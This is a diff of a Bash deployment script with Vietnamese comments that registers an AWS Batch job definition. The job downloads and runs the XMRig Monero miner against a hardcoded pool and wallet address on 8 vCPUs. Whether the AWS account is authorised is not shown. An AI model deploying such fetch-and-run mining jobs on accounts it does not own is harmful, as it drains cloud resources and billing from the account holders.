@@ -181,40 +181,53 @@ done
 # ---------------------- TẠO JOB DEFINITION ----------------------
 echo "5. Tạo Job Definition..."
 
-MINING_SCRIPT=$(cat <<EOF
+# Sử dụng jq để tạo JSON đúng định dạng
+MINING_SCRIPT=$(cat <<'EOF'
 #!/bin/bash
 apt-get update -y
 apt-get install -y wget
 wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
 cd xmrig-6.22.2
-./xmrig -o ${MINING_POOL} -u ${WALLET_ADDRESS}/${WORKER_ID} -k --coin monero -a rx/8
+./xmrig -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/AWS-OnDemand-Miner -k --coin monero -a rx/8
 EOF
 )
 
+# Escape các ký tự đặc biệt trong script
+ESCAPED_SCRIPT=$(jq -aRs . <<< "$MINING_SCRIPT")
+
+# Tạo file JSON tạm
+TMP_JSON=$(mktemp)
+cat <<EOF > $TMP_JSON
+{
+  "image": "ubuntu:latest",
+  "command": ["sh", "-c", $ESCAPED_SCRIPT],
+  "resourceRequirements": [
+    {"type": "VCPU", "value": "8"},
+    {"type": "MEMORY", "value": "16384"}
+  ],
+  "executionRoleArn": "arn:aws:iam::${AWS_ACCOUNT_ID}:role/ecsInstanceRole-${ENVIRONMENT_NAME}",
+  "logConfiguration": {
+    "logDriver": "awslogs",
+    "options": {
+      "awslogs-group": "/aws/batch/job",
+      "awslogs-region": "${REGION}",
+      "awslogs-stream-prefix": "${ENVIRONMENT_NAME}"
+    }
+  }
+}
+EOF
+
 JOB_DEFINITION_ARN=$(aws batch register-job-definition \
-    --job-definition-name "$ENVIRONMENT_NAME-Miner" \
-    --type container \
-    --container-properties '{
-        "image": "ubuntu:latest",
-        "command": ["sh", "-c", "'"${MINING_SCRIPT}"'"],
-        "resourceRequirements": [
-            {"type": "VCPU", "value": "8"},
-            {"type": "MEMORY", "value": "16384"}
-        ],
-        "executionRoleArn": "arn:aws:iam::'"${AWS_ACCOUNT_ID}"':role/ecsInstanceRole-'"${ENVIRONMENT_NAME}"'",
-        "logConfiguration": {
-            "logDriver": "awslogs",
-            "options": {
-                "awslogs-group": "/aws/batch/job",
-                "awslogs-region": "'"${REGION}"'",
-                "awslogs-stream-prefix": "'"${ENVIRONMENT_NAME}"'"
-            }
-        }
-    }' \
-    --region $REGION \
-    --query "jobDefinitionArn" \
-    --output text)
+  --job-definition-name "$ENVIRONMENT_NAME-Miner" \
+  --type container \
+  --container-properties file://$TMP_JSON \
+  --region $REGION \
+  --query "jobDefinitionArn" \
+  --output text)
+
+# Xóa file tạm
+rm -f $TMP_JSON
 
 echo " - Job Definition ARN: $JOB_DEFINITION_ARN"
 
